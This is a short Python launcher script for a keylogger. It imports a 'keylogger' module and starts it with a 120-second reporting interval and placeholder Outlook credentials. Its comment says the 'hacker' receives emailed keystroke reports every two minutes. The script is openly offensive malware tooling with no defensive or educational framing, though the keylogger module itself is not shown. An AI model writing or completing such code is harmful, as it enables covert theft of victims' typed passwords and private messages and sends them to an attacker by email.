#!/usr/bin/env python
#importing the Keylogger file 
import keylogger
# time is set to 120 secs so for every 120 seconds the hacker recieves a new mail for the reports 
my_keylogger = keylogger.Keylogger(120, "enter your outlook mail id ", "enter your password")
my_keylogger.start()
